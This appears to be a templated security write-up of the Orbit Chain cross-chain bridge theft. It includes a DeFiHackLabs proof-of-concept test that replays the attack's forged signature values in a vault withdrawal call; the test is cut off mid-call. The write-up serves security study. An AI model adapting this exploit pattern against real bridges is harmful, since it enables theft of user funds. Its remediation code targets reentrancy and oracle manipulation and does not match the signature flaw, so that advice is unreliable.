# Orbit Chain — Cross-Chain Bridge Asset Theft via Multi-Signature Verification Bypass Analysis

| Item | Details |
|------|------|
| **Date** | 2024-01-01 |
| **Protocol** | Orbit Chain |
| **Chain** | Ethereum |
| **Loss** | ~$81M |
| **Attacker** | [0x9263e7873613ddc598](https://etherscan.io/address/0x9263e7873613ddc598a701709875634819176aff) |
| **Attack Tx** | [0xe0bada18fdc56dec12](https://etherscan.io/tx/0xe0bada18fdc56dec125c31b1636490f85ba66016318060a066ed7050ff7271f9) |
| **Vulnerable Contract** | [0x1bf68a9d1eaee7826b](https://etherscan.io/address/0x1bf68a9d1eaee7826b3593c20a0ca93293cb489a) |
| **Root Cause** | Cross-chain bridge asset theft via multi-signature verification bypass |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/OrbitChain_exp.sol) |

---
## 1. Vulnerability Overview

Orbit Chain is a DeFi protocol operating on the Ethereum chain that suffered a **signature forgery** attack on 2024-01-01.
The attacker exploited a cross-chain bridge asset theft via multi-signature verification bypass, causing approximately **~$81M** in damages.

### Key Vulnerability Summary
- **Classification**: Signature Forgery
- **Impact**: Protocol asset loss of ~$81M
- **Attack Vector**: Signature Forgery

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Problem: Cross-chain bridge asset theft via multi-signature verification bypass
// The attacker exploits this logic to gain unauthorized profit

// IOrbitBridge interface — vulnerable signature verification function
interface IOrbitBridge {
    // ❌ Vulnerable: Does not sufficiently validate the signature arrays (v, r, s)
    // Allows withdraw calls using replayed or forged signatures
    function withdraw(
        address hubContract,
        string memory fromChain,
        bytes memory fromAddr,
        address toAddr,
        address token,
        bytes32[] memory bytes32s,
        uint256[] memory uints,
        bytes memory data,
        uint8[] memory v,
        bytes32[] memory r,
        bytes32[] memory s
    ) external;

    // ✅ Safe: Chain identifier lookup (should be used in validation)
    function chain() external view returns (string memory);
}

// ✅ Correct signature verification implementation example
function safeWithdraw(
    address hubContract,
    string memory fromChain,
    bytes memory fromAddr,
    address toAddr,
    address token,
    bytes32[] memory bytes32s,
    uint256[] memory uints,
    bytes memory data,
    uint8[] memory v,
    bytes32[] memory r,
    bytes32[] memory s
) external {
    // ✅ Signature replay prevention: check nonce or txHash record
    bytes32 txHash = keccak256(abi.encodePacked(fromChain, fromAddr, toAddr, token, uints[0]));
    require(!usedHashes[txHash], "Replay: already processed");
    // ✅ Verify that the multi-signature threshold is met
    require(v.length >= requiredSigners, "Insufficient signatures");
    // ✅ Verify that each signer is an actually authorized oracle
    for (uint256 i = 0; i < v.length; i++) {
        address signer = ecrecover(txHash, v[i], r[i], s[i]);
        require(isAuthorizedOracle[signer], "Unauthorized signer");
    }
    usedHashes[txHash] = true;
    // Process actual withdrawal
}
```

---
### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: EthVault.sol
contract EthVault is MultiSigWallet{
    string public constant chain = "ETH";

    bool public isActivated = true;

    address payable public implementation;
    address public tetherAddress;

    uint public depositCount = 0;

    mapping(bytes32 => bool) public isUsedWithdrawal;  // ❌ Vulnerability

    mapping(bytes32 => address) public tokenAddr;
    mapping(address => bytes32) public tokenSummaries;

    mapping(bytes32 => bool) public isValidChain;

    constructor(address[] memory _owners, uint _required, address payable _implementation, address _tetherAddress) MultiSigWallet(_owners, _required) public {
        implementation = _implementation;
        tetherAddress = _tetherAddress;

        // klaytn valid chain default setting
        isValidChain[sha256(abi.encodePacked(address(this), "KLAYTN"))] = true;
    }

    function _setImplementation(address payable _newImp) public onlyWallet {
        require(implementation != _newImp);
        implementation = _newImp;

    }

    function () payable external {
        address impl = implementation;
        require(impl != address(0));
        assembly {
            let ptr := mload(0x40)
            calldatacopy(ptr, 0, calldatasize)
            let result := delegatecall(gas, impl, ptr, calldatasize, 0, 0)
            let size := returndatasize
            returndatacopy(ptr, 0, size)

            switch result
            case 0 { revert(ptr, size) }
            default { return(ptr, size) }
        }
    }
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Forge Signatures] ─── Bridge Contract
  │                    (Signature verification bypass)
  ▼
[Withdrawal Request] ── Multi-signature Verification
  │                    (Insufficient validation)
  ▼
[Asset Theft] ────────── Target Token Withdrawal
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - OrbitChain_exp.sol
// Chain: Ethereum | Date: 2024-01-01

    function testExploit() public {
        deal(address(WBTC), orbitExploiterToAddr, 0);
        emit log_named_decimal_uint(
            "Exploiter WBTC balance before attack", WBTC.balanceOf(orbitExploiterToAddr), WBTC.decimals()
        );
        // At first exploiter has deposited some WBTC tokens (acquired from Uniswap) to Orbit in tx:
        // https://explorer.phalcon.xyz/tx/eth/0x9d1351ca4ede8b36ca9cd9f9c46e3b08890d13d94dfd3074d9bb66bbcc2629b1

        // Hash of the tx from Orbit chain. Details can be found at https://bridge.orbitchain.io/ explorer
        bytes32 orbitTxHash = 0xf7f60c98b04d45c371bcccf6aa12ebcd844fca6b17e7cd77503d6159d60a1aaa;
        bytes32[] memory bytes32s = new bytes32[](2);
        bytes32s[0] = sha256(abi.encodePacked(orbitHubContractAddress, OrbitEthVault.chain(), address(OrbitEthVault)));
        bytes32s[1] = orbitTxHash;

        // Values specific to fake signatures from attack tx
        uint256[] memory uints = new uint256[](3);
        uints[0] = 23_087_900_000; // token withdraw amount
        uints[1] = WBTC.decimals();
        uints[2] = 8735; // unique identifier for requesting bridging ex, depositId

        // v, r, s signature values from attack tx
        uint8[] memory v = new uint8[](7);
        v[0] = 27;
        v[1] = 28;
        v[2] = 28;
        v[3] = 27;
        v[4] = 28;
        v[5] = 28;
        v[6] = 27;

        bytes32[] memory r = new bytes32[](7);
        r[0] = 0x3ef06a27b3565a82b6d72af184ca3d787e3dd8fc0bd56bb0e7dce2faf920257d;
        r[1] = 0xf1d81597f32c9376e90d22b9a1f121f1a99a1c191f8e930ed0de6df7b759a154;
        r[2] = 0x3b7169e2ee2b73dcfbabae1400b811b95616cb5dc547b8b7b7c6aeb37b5b906b;
        r[3] = 0xd4b7fd0617b28e1eeb018e1dbf924e662d1a0520cad96af2fcf496e16f4c58c6;
        r[4] = 0xe06c17f1a6630bfa47f0fe0cfba02f40f0901e2412713e4c7f46ae17a25dc92c;
        r[5] = 0xdecb2622da70fee1c343b93dc946eb855fd32c59b293c0765cb94a71e62aeff3;
        r[6] = 0xff7c705149017ce467d05717eadb0a2718aedc7a1799ad153d05e8fc48be853e;

        bytes32[] memory s = new bytes32[](7);
        s[0] = 0x0cc266abfa2ba924ffa7dab0cd8f7bb1a14891ec74dea53927c09296d1c6ac7c;
        s[1] = 0x739fe72bab59a2eead1e36fdf71441e0407332c508165e460a2cde5418858e1b;
        s[2] = 0x18303ee09818b0575ea4a5c2ed25b1e78523aa2b387a9c7c9c23b0d906ff9e07;
        s[3] = 0x37da521031f0a65dd8466d4def41c44a69796f696965c42f9705447286c0ac9a;
        s[4] = 0x5443cf63033ab211f205076622b2426b994ce3706c1ee2464a68ef168c7639bb;
        s[5] = 0x725fa18d06acb4f6f8a5b143bca088d76f77d9531765dea6799b484373d0641b;
        s[6] = 0x6b6ddbaaafc5f0580b670ad9d0913ca4c60df2753151a499117086aa725cf2c7;

        OrbitEthVault.withdraw(
            orbitHubContractAddress,
            "ORBIT",
            abi.encodePacked(orbitExploiterFromAddr),
            orbitExploiterToAddr,
            address(WBTC),
            bytes32s,
            uints,
            "",
            v,
            r,
            s
```

> **Note**: The above code is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Classification Criteria | Details |
|-----------|------|
| **DASP Top 10** | Signature Forgery |
| **Attack Type** | Access Control |
| **Vulnerability Category** | Cryptographic Vulnerability |
| **Attack Complexity** | Medium |
| **Preconditions** | Access to vulnerable function |
| **Impact Scope** | Entire protocol liquidity |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Suspend vulnerable function**: Apply emergency pause to the attacked function
2. **Assess damage**: Classify the scale of lost assets and affected users
3. **Notify relevant parties**: Immediately notify related DEXs, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not use spot price alone
}
```

### Long-Term Improvements
- Conduct **independent security audits** (at least 2 audit firms)
- Operate a **bug bounty program**
- Build a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency stop mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Signature forgery attacks are preventable**: Defensible with proper validation and pattern application
2. **Consider economic incentives**: Design every function with the attacker's economic motivation in mind
3. **Audit priority**: Functions that directly handle assets are the top audit priority

### For Protocol Operators
1. **Real-time monitoring**: Build systems to immediately detect abnormal large-scale transactions
2. **Incident response plan**: Maintain a response playbook that can be executed immediately upon attack
3. **Insurance**: Distribute risk through DeFi insurance protocols

### For the Broader DeFi Ecosystem
- The **2024-01-01** Orbit Chain incident reconfirms the danger of **signature forgery** attacks in the Ethereum ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Recommend strengthening community-level security information sharing mechanisms

---
*This document was written for educational and security research purposes. Do not misuse.*
*PoC source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/OrbitChain_exp.sol)*